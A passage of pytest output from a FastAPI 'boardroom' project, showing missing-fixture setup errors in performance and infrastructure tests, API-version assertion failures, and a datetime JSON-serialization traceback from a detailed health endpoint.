              success_count = len([r for r in responses if r.status_code == 200])
              success_rate = success_count / batch_size

              assert success_rate >= 1.0  # 100% success rate expected
              assert batch_time < 5.0  # Batch should complete within 5 seconds

              throughput = batch_size / batch_time

              print(f"Batch performance (size {batch_size}): {batch_time:.3f}s, {throughput:.1f} req/s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:578
_____ ERROR at setup of TestLoadTesting.test_batch_request_performance[10] _____
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 578
      @pytest.mark.parametrize("batch_size", [5, 10, 20])
      async def test_batch_request_performance(self, client: AsyncClient, batch_size: int):
          """Test performance with different batch sizes."""
          with patch('app.services.database.database_service') as mock_db:
              mock_db.health_check.return_value = {"status": "healthy", "database": "connected"}

              start_time = time.time()

              # Send batch of concurrent requests
              tasks = [client.get("/health") for _ in range(batch_size)]
              responses = await asyncio.gather(*tasks)

              end_time = time.time()
              batch_time = end_time - start_time

              # All requests should succeed
              success_count = len([r for r in responses if r.status_code == 200])
              success_rate = success_count / batch_size

              assert success_rate >= 1.0  # 100% success rate expected
              assert batch_time < 5.0  # Batch should complete within 5 seconds

              throughput = batch_size / batch_time

              print(f"Batch performance (size {batch_size}): {batch_time:.3f}s, {throughput:.1f} req/s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:578
_____ ERROR at setup of TestLoadTesting.test_batch_request_performance[20] _____
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 578
      @pytest.mark.parametrize("batch_size", [5, 10, 20])
      async def test_batch_request_performance(self, client: AsyncClient, batch_size: int):
          """Test performance with different batch sizes."""
          with patch('app.services.database.database_service') as mock_db:
              mock_db.health_check.return_value = {"status": "healthy", "database": "connected"}

              start_time = time.time()

              # Send batch of concurrent requests
              tasks = [client.get("/health") for _ in range(batch_size)]
              responses = await asyncio.gather(*tasks)

              end_time = time.time()
              batch_time = end_time - start_time

              # All requests should succeed
              success_count = len([r for r in responses if r.status_code == 200])
              success_rate = success_count / batch_size

              assert success_rate >= 1.0  # 100% success rate expected
              assert batch_time < 5.0  # Batch should complete within 5 seconds

              throughput = batch_size / batch_time

              print(f"Batch performance (size {batch_size}): {batch_time:.3f}s, {throughput:.1f} req/s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:578
_______________ ERROR at setup of test_database_session_fixture ________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 12
  @pytest.mark.unit
  async def test_database_session_fixture(db_session: AsyncSession):
      """Test that the database session fixture is working correctly."""
      assert db_session is not None
      assert hasattr(db_session, 'execute')
      assert hasattr(db_session, 'commit')
      assert hasattr(db_session, 'rollback')
E       fixture 'db_session' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:12
_________________ ERROR at setup of test_async_client_fixture __________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 21
  @pytest.mark.unit
  async def test_async_client_fixture(client: AsyncClient):
      """Test that the async client fixture is working correctly."""
      assert client is not None
      assert hasattr(client, 'get')
      assert hasattr(client, 'post')
      assert hasattr(client, 'put')
      assert hasattr(client, 'delete')
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:21
_________________ ERROR at setup of test_health_check_endpoint _________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 31
  @pytest.mark.integration
  async def test_health_check_endpoint(client: AsyncClient):
      """Test the health check endpoint to verify API connectivity."""
      response = await client.get("/health")
      assert response.status_code in [200, 503]  # 503 if DB connection fails

      data = response.json()
      assert "status" in data
      assert "version" in data
      assert "environment" in data
      assert "components" in data
      assert data["environment"] == "test"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:31
_____________________ ERROR at setup of test_root_endpoint _____________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 45
  @pytest.mark.integration
  async def test_root_endpoint(client: AsyncClient):
      """Test the root endpoint."""
      response = await client.get("/")
      assert response.status_code == 200

      data = response.json()
      assert "name" in data
      assert "version" in data
      assert "status" in data
      assert data["status"] == "healthy"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:45
_________________ ERROR at setup of test_mock_langfuse_fixture _________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 128
  @pytest.mark.unit
  async def test_mock_langfuse_fixture(mock_langfuse):
      """Test that the Langfuse mock is working correctly."""
      assert mock_langfuse is not None
      assert hasattr(mock_langfuse, 'trace')
      assert hasattr(mock_langfuse, 'generation')
E       fixture 'mock_langfuse' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:128
_______________ ERROR at setup of test_mock_llm_service_fixture ________________
file /home/paul/boardroom-repo/tests/test_infrastructure.py, line 136
  @pytest.mark.unit
  async def test_mock_llm_service_fixture(mock_llm_service):
      """Test that the LLM service mock is working correctly."""
      assert mock_llm_service is not None
      assert hasattr(mock_llm_service, 'generate_response')

      response = mock_llm_service.generate_response("test prompt")
      assert response == "Mocked LLM response"
E       fixture 'mock_llm_service' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/test_infrastructure.py:136
=================================== FAILURES ===================================
________________ TestAPIStandards.test_standard_headers_present ________________
tests/integration/test_api_standards.py:80: in test_standard_headers_present
    assert response.headers["x-api-version"] == "1.0.0"
E   AssertionError: assert '0.01' == '1.0.0'
E     
E     - 1.0.0
E     + 0.01
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.393841Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:6666cd76f96956469e7be39d750cc7d9[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
WARNING  app.core.response_optimization:response_optimization.py:227 Cache storage error: 'utf-8' codec can't decode byte 0x8b in position 1: invalid start byte
_______________ TestAPIStandards.test_api_version_info_endpoint ________________
tests/integration/test_api_standards.py:97: in test_api_version_info_endpoint
    assert "deprecated_versions" in version_info
E   AssertionError: assert 'deprecated_versions' in {'documentation_url': 'http://testserver/docs', 'latest_version': '0.01', 'supported_versions': ['1.0.0', 'v1'], 'version': '0.01'}
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.402623Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:e7182fdc6468a78af04ea4f718f24102[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
________________ TestAPIStandards.test_detailed_health_endpoint ________________
tests/integration/test_api_standards.py:162: in test_detailed_health_endpoint
    response = client.get("/api/v1/standards/health/detailed")
.venv/lib/python3.13/site-packages/starlette/testclient.py:465: in get
    return super().get(
.venv/lib/python3.13/site-packages/httpx/_client.py:1053: in get
    return self.request(
.venv/lib/python3.13/site-packages/starlette/testclient.py:437: in request
    return super().request(
.venv/lib/python3.13/site-packages/httpx/_client.py:825: in request
    return self.send(request, auth=auth, follow_redirects=follow_redirects)
.venv/lib/python3.13/site-packages/httpx/_client.py:914: in send
    response = self._send_handling_auth(
.venv/lib/python3.13/site-packages/httpx/_client.py:942: in _send_handling_auth
    response = self._send_handling_redirects(
.venv/lib/python3.13/site-packages/httpx/_client.py:979: in _send_handling_redirects
    response = self._send_single_request(request)
.venv/lib/python3.13/site-packages/httpx/_client.py:1014: in _send_single_request
    response = transport.handle_request(request)
.venv/lib/python3.13/site-packages/starlette/testclient.py:340: in handle_request
    raise exc
.venv/lib/python3.13/site-packages/starlette/testclient.py:337: in handle_request
    portal.call(self.app, scope, receive, send)
.venv/lib/python3.13/site-packages/anyio/from_thread.py:290: in call
    return cast(T_Retval, self.start_task_soon(func, *args).result())
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:456: in result
    return self.__get_result()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:401: in __get_result
    raise self._exception
.venv/lib/python3.13/site-packages/anyio/from_thread.py:221: in _call_func
    retval = await retval_or_awaitable
.venv/lib/python3.13/site-packages/fastapi/applications.py:1054: in __call__
    await super().__call__(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/applications.py:112: in __call__
    await self.middleware_stack(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/middleware/errors.py:187: in __call__
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/errors.py:165: in __call__
    await self.app(scope, receive, _send)
.venv/lib/python3.13/site-packages/starlette/middleware/cors.py:85: in __call__
    await self.app(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:173: in __call__
    with recv_stream, send_stream, collapse_excgroups():
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:162: in __exit__
    self.gen.throw(value)
.venv/lib/python3.13/site-packages/starlette/_utils.py:82: in collapse_excgroups
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:175: in __call__
    response = await self.dispatch_func(request, call_next)
app/core/middleware.py:151: in dispatch
    response = await call_next(request)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:153: in call_next
    raise app_exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:140: in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:173: in __call__
    with recv_stream, send_stream, collapse_excgroups():
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:162: in __exit__
    self.gen.throw(value)
.venv/lib/python3.13/site-packages/starlette/_utils.py:82: in collapse_excgroups
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:175: in __call__
    response = await self.dispatch_func(request, call_next)
app/core/middleware.py:58: in dispatch
    response = await call_next(request)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:153: in call_next
    raise app_exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:140: in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:173: in __call__
    with recv_stream, send_stream, collapse_excgroups():
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:162: in __exit__
    self.gen.throw(value)
.venv/lib/python3.13/site-packages/starlette/_utils.py:82: in collapse_excgroups
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:175: in __call__
    response = await self.dispatch_func(request, call_next)
app/core/cache_middleware.py:95: in dispatch
    response = await call_next(request)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:153: in call_next
    raise app_exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:140: in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:173: in __call__
    with recv_stream, send_stream, collapse_excgroups():
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:162: in __exit__
    self.gen.throw(value)
.venv/lib/python3.13/site-packages/starlette/_utils.py:82: in collapse_excgroups
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:175: in __call__
    response = await self.dispatch_func(request, call_next)
app/core/response_optimization.py:53: in dispatch
    response = await call_next(request)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:153: in call_next
    raise app_exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:140: in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
app/core/api_standards.py:70: in __call__
    await self.app(scope, receive, send_wrapper)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:173: in __call__
    with recv_stream, send_stream, collapse_excgroups():
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:162: in __exit__
    self.gen.throw(value)
.venv/lib/python3.13/site-packages/starlette/_utils.py:82: in collapse_excgroups
    raise exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:175: in __call__
    response = await self.dispatch_func(request, call_next)
.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py:57: in dispatch
    raise e from None
.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py:53: in dispatch
    response = await call_next(request)
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:153: in call_next
    raise app_exc
.venv/lib/python3.13/site-packages/starlette/middleware/base.py:140: in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
.venv/lib/python3.13/site-packages/starlette/middleware/exceptions.py:62: in __call__
    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/_exception_handler.py:53: in wrapped_app
    raise exc
.venv/lib/python3.13/site-packages/starlette/_exception_handler.py:42: in wrapped_app
    await app(scope, receive, sender)
.venv/lib/python3.13/site-packages/starlette/routing.py:714: in __call__
    await self.middleware_stack(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/routing.py:734: in app
    await route.handle(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/routing.py:288: in handle
    await self.app(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/routing.py:76: in app
    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
.venv/lib/python3.13/site-packages/starlette/_exception_handler.py:53: in wrapped_app
    raise exc
.venv/lib/python3.13/site-packages/starlette/_exception_handler.py:42: in wrapped_app
    await app(scope, receive, sender)
.venv/lib/python3.13/site-packages/starlette/routing.py:73: in app
    response = await f(request)
.venv/lib/python3.13/site-packages/fastapi/routing.py:301: in app
    raw_response = await run_endpoint_function(
.venv/lib/python3.13/site-packages/fastapi/routing.py:212: in run_endpoint_function
    return await dependant.call(**values)
.venv/lib/python3.13/site-packages/slowapi/extension.py:734: in async_wrapper
    response = await func(*args, **kwargs)  # type: ignore
app/api/v1/standards.py:107: in get_detailed_health
    return JSONResponse(
.venv/lib/python3.13/site-packages/starlette/responses.py:182: in __init__
    super().__init__(content, status_code, headers, media_type, background)
.venv/lib/python3.13/site-packages/starlette/responses.py:45: in __init__
    self.body = self.render(content)
.venv/lib/python3.13/site-packages/starlette/responses.py:185: in render
    return json.dumps(
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/__init__.py:238: in dumps
    **kw).encode(obj)
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py:200: in encode
    chunks = self.iterencode(o, _one_shot=True)
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py:261: in iterencode
    return _iterencode(o, 0)
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py:180: in default
    raise TypeError(f'Object of type {o.__class__.__name__} '
E   TypeError: Object of type datetime is not JSON serializable
----------------------------- Captured stdout call -----------------------------
2025-07-05 15:22:33,479 INFO sqlalchemy.engine.Engine BEGIN (implicit)
2025-07-05 15:22:33,479 INFO sqlalchemy.engine.Engine SELECT 1 as test
2025-07-05 15:22:33,479 INFO sqlalchemy.engine.Engine [generated in 0.00008s] ()
2025-07-05 15:22:33,480 INFO sqlalchemy.engine.Engine ROLLBACK
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.427988Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:63a87bb2716e6425abe354486287833d[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
INFO     sqlalchemy.engine.Engine:log.py:210 BEGIN (implicit)
INFO     sqlalchemy.engine.Engine:log.py:210 SELECT 1 as test
INFO     sqlalchemy.engine.Engine:log.py:210 [generated in 0.00008s] ()
INFO     sqlalchemy.engine.Engine:log.py:210 ROLLBACK
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:22:33.482717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35mtestclient[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Object of type datetime is not JSON serializable'[0m [36merror_type[0m=[35mserver_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/v1/standards/health/detailed[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
ERROR    app.core.logging:middleware.py:82 [2m2025-07-05T14:22:33.482825Z[0m [[31m[1merror    [0m] [1mmiddleware_error              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Object of type datetime is not JSON serializable'[0m [36mfilename[0m=[35mmiddleware.py[0m [36mfunc_name[0m=[35mdispatch[0m [36mlineno[0m=[35m82[0m [36mmodule[0m=[35mmiddleware[0m [36mpath[0m=[35m/api/v1/standards/health/detailed[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/middleware.py[0m
Traceback (most recent call last):
  File "/home/paul/boardroom-repo/app/core/middleware.py", line 58, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/cache_middleware.py", line 95, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/response_optimization.py", line 53, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/app/core/api_standards.py", line 70, in __call__
    await self.app(scope, receive, send_wrapper)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
